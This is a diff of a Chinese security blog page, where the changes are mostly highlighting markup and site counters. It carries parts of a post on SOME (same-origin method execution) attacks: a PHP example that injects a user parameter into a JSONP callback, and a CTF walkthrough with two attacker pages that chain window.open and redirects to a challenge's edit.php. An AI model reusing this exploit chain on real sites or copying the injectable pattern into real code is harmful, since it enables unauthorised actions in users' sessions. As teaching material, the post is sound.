@@ -529,7 +529,7 @@
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">https:</span><span class="comment">//example.com/main  </span></span><br><span class="line">&lt;?php  </span><br><span class="line">echo ‘&lt;script src="https:<span class="comment">//example.com/jsonp?callback=’ . $_GET[“userParam”] .‘ “&gt;’;  </span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>在上面的代码段中，用户的输入被直接注入到了 script 标签中，JSONP(<a href="https://example.com/jsonp)会返回类似如下的内容" target="_blank" rel="noopener">https://example.com/jsonp)会返回类似如下的内容</a>:</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">userParam</span><span class="params">(&#123; jsonp : data &#125;)</span></span> <span class="comment">// userParam 就是用户之前通过 GET 方法提交的内容</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user<span class="constructor">Param(&#123; <span class="params">jsonp</span> : <span class="params">data</span> &#125;)</span> <span class="comment">// userParam 就是用户之前通过 GET 方法提交的内容</span></span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p><strong>深入利用</strong><br>如果攻击者发现一个网站应用存在 SOME 漏洞，那他们绝不会仅仅满足于浏览网页上的各个元素，相反，通过使用 Javascript 内建的 window.opener 方法可以打开同源网站的其他页面。利用这种方法可以大大的扩展攻击面，但缺点也很明显就是需要打开多个页面。</p>
@@ -586,14 +586,14 @@
 <blockquote>
 <p> vps上写两个页面:</p>
 <ol>
-<li>1.html<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;    <span class="function"><span class="keyword">function</span> <span class="title">start_some</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;        <span class="built_in">window</span>.open(<span class="string">"2.html"</span>);</span></span><br><span class="line"><span class="actionscript">&gt;        location.replace(<span class="string">"http://[题目地址]/user.php"</span>);</span></span><br><span class="line"><span class="undefined">&gt;    &#125;</span></span><br><span class="line"><span class="undefined">&gt;    setTimeout(start_some(), 1000);</span></span><br><span class="line"><span class="undefined">&gt;  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<li>1.html<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">&gt;    <span class="function"><span class="keyword">function</span> <span class="title">start_some</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;        <span class="built_in">window</span>.open(<span class="string">"2.html"</span>);</span></span><br><span class="line"><span class="actionscript">&gt;        location.replace(<span class="string">"http://[题目地址]/user.php"</span>);</span></span><br><span class="line">&gt;    &#125;</span><br><span class="line">&gt;    setTimeout(start_some(), 1000);</span><br><span class="line">&gt;  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 </blockquote>
 <blockquote>
 <ol start="2">
 <li><p>2.html</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;       <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">&gt;           location.replace(<span class="string">"http://[题目地址]/edit.php?callback=RandomProfile&amp;user=[你的用户名]"</span>);</span></span><br><span class="line"><span class="undefined">&gt;       &#125;</span></span><br><span class="line"><span class="undefined">&gt;       setTimeout(attack, 2000);</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">&gt;       <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">&gt;           location.replace(<span class="string">"http://[题目地址]/edit.php?callback=RandomProfile&amp;user=[你的用户名]"</span>);</span></span><br><span class="line">&gt;       &#125;</span><br><span class="line">&gt;       setTimeout(attack, 2000);</span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 </blockquote>
@@ -808,7 +808,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -830,7 +830,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">80</span>
+                  <span class="site-state-item-count">83</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -990,7 +990,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">42.9k</span>
+    <span title="Site words total count">43.4k</span>
   
 </div>
 
